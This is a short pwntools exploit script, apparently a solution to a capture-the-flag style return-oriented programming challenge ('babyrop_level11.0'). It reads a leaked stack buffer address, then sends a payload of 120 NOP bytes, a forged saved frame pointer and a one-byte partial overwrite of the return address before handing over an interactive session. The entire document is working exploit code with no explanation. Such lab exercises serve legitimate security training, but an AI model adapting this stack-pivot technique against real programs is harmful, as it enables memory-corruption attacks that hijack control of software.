from pwn import *
context.binary = "/challenge/babyrop_level11.0"
p = process()
p.recvuntil(b'located at: ')
input_buffer = int(p.recvuntil(b'.').decode().strip('.'),base=16)
log.success("Input buffer: %s", hex(input_buffer))
payload = asm('nop')*120 + p64(input_buffer-16)+ b'\xb1'
p.send(payload)
p.interactive()